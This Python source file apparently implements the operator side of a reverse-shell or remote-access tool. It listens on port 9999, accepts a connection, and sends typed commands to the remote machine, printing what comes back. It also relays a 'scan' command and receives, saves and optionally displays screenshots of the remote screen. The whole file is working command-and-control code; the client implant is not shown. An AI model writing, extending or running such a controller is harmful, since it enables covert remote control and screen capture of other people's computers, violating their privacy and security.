import socket
import sys
import io
from PIL import Image
from datetime import datetime

# Create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("\nBinding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)  # 5 is the number of bad connections it will tolerate before refusing new connections
                        # it is arbitrary set to 5 and can be changed
                    

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection successful. |" + " IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):

    while True:

        cmd = input()
        # if the command is quit, close the connection
        if cmd == 'quit': 
            conn.close()
            s.close()
            sys.exit()

        elif cmd.startswith("scan"):
            conn.send(str.encode(cmd))
            print("Résultats du scan :\n")
            response = conn.recv(4096).decode("utf-8")
            print(response)
            continue

        conn.send(str.encode(cmd))

        if cmd == 'screenshot':
            receive_screenshot(conn)



        else:

            client_response = str(conn.recv(4096), "utf-8")
            print(client_response, end="")

def receive_screenshot(data_stream):

    print("\nReceiving screenshot...\n")

    # Receive the size of the screenshot data
    size_bytes = data_stream.recv(4)
    size = int.from_bytes(size_bytes, byteorder='big')
    print(f"\nExpected size of screenshot data: {size} bytes")

    data = b""
    while len(data) < size:
        packet = data_stream.recv(4096)
        if not packet:
            break
        data += packet
    
    print(f"\nReceived {len(data)} bytes of data")


    try: 
        image = Image.open(io.BytesIO(data))

        exact_time = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
        screen_name = f"screenshot_{exact_time}.png"


        image.save("screenshots/" + screen_name)
        print("\nScreenshot received and saved as : " + screen_name)

        open_screenshot = input("\nDo you want to open the screenshot? (y/n): ")

        if open_screenshot.lower() == 'y':
            image.show()
        else:
            pass


    except Exception as e:
        print(f"Error in receive_screenshot: {e}")
    

def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
